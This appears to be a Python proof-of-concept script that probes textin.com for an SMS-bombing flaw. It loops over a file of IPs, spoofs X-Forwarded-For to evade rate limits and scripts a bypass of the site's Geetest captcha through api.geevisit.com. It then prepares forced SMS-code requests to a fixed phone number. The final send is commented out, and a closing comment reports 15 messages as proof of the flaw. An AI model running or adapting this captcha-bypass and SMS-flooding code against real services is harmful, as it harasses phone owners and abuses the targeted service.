import json
import time

import cchardet as cchardet
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def do():
    ip_list = []
    with open('../fuzz/ip.txt', 'r') as file:
        for line in file:
            # 去除行尾的换行符并添加到列表中
            ip_list.append(line.rstrip('\n'))
    success_num = 0
    for ip in ip_list:
        headers1 = {
            "Host": "api.textin.com",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Cache-Control": "no-cache",
            "Origin": "https://www.textin.com",
            "Pragma": "no-cache",
            "Referer": "https://www.textin.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
            "dnt": "1",
            "pragma": "no-cache",
            "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-gpc": "1",
            "X-Forwarded-For": ip,
        }
        url1 = "https://www.textin.com/user/init_captcha"
        r1 = requests.get(url=url1, timeout=5, verify=False, headers=headers1)
        data1 = json.loads(r1.text)
        print(data1)
        gt = data1['data']['gt']
        old_challenge = data1['data']['challenge']

        headers2 = {
            "Host": "api.geevisit.com",
            "Connection": "close",
            "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            "sec-ch-ua-mobile": "?0",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
            "sec-ch-ua-platform": '"Windows"',
            "Accept": "*/*",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "no-cors",
            "Sec-Fetch-Dest": "script",
            "Referer": "https://www.textin.com/",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "dnt": "1",
            "sec-gpc": "1",
        }
        url2 = "https://api.geevisit.com/ajax.php?gt=" + gt + "&challenge=" + old_challenge + "&lang=zh-cn&pt=0&client_type=web"
        r2 = requests.get(url=url2, timeout=5, verify=False, headers=headers2)
        print(r2.text)
        if "validate" in r2.text:
            data2 = json.loads(r2.text[1:-1])
            validate = data2['data']['validate']
            geetest_challenge = validate
            geetest_validate = validate
        elif "slide" in r2.text:
            url3 = "https://api.geevisit.com/get.php?is_next=true&type=slide3&gt=" + gt + "&challenge=" + old_challenge + "&lang=zh-cn&https=false&protocol=https%3A%2F%2F&offline=false&product=embed&api_server=api.geevisit.com&isPC=true&autoReset=true&width=100%25&callback=geetest_1686553287819"
            r3 = requests.get(url=url3, timeout=5, verify=False)
            res_encoding = r3.encoding
            con_encoding = cchardet.detect(r3.content)['encoding']
            text3 = r3.text.encode(res_encoding).decode(con_encoding)
            print(text3)
            data3 = json.loads(text3[22:-1])
            geetest_challenge = data3['challenge']
            url2 = "https://api.geevisit.com/ajax.php?gt=" + gt + "&challenge=" + geetest_challenge + "&lang=zh-cn&pt=0&client_type=web"
            r2 = requests.get(url=url2, timeout=5, verify=False, headers=headers2)
            print(r2.text)
            if "validate" in r2.text:
                data2 = json.loads(r2.text[1:-1])
                validate = data2['data']['validate']
                geetest_validate = validate
            else:
                time.sleep(1)
                continue
        elif "click" in r2.text:
            geetest_validate = old_challenge
            url3 = "https://api.geevisit.com/get.php?is_next=true&type=click&gt=" + gt + "&challenge=" + old_challenge + "&lang=zh-cn&https=false&protocol=https%3A%2F%2F&offline=false&product=embed&api_server=api.geevisit.com&isPC=true&autoReset=true&width=100%25&callback=geetest_1686556612602"
            requests.get(url=url3, timeout=5, verify=False, headers=headers2)
            url2 = "https://api.geevisit.com/ajax.php?gt=" + gt + "&challenge=" + old_challenge + "&lang=zh-cn&pt=0&client_type=web"
            r2 = requests.get(url=url2, timeout=5, verify=False, headers=headers2)
            print(r2.text)
            if "validate" in r2.text:
                data2 = json.loads(r2.text[1:-1])
                validate = data2['data']['validate']
                geetest_validate = validate
            else:
                time.sleep(1)
                continue

        headers3 = {
            "Host": "api.textin.com",
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Cache-Control": "no-cache",
            "Content-Length": "294",
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": "https://www.textin.com",
            "Pragma": "no-cache",
            "Referer": "https://www.textin.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
            "dnt": "1",
            "pragma": "no-cache",
            "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-gpc": "1",
            "X-Forwarded-For": ip,
        }
        mobile = "13888888887"
        sms_body = '{"mobile": "' + mobile + '","old_challenge": "' + old_challenge + '","operation_type":"textin_register","geetest_challenge": "' + geetest_challenge + '","geetest_validate":"' + geetest_validate + '","geetest_seccode":"' + geetest_validate + '|jordan","force_send":1}'
        url5 = "https://www.textin.com/user/apply_code"
        # print(sms_body)
        # r5 = requests.post(url=url5, data=sms_body, headers=headers3, timeout=5, verify=False)
        # if mobile in r5.text:
        #     print(r5.text)
        #     success_num = success_num + 1
        # else:
        #     print(r5.text)
        # if success_num >= 15:
        #     print("测试成功发送15条信息，存在短信轰炸漏洞！")
        #     break


if __name__ == "__main__":
    do()
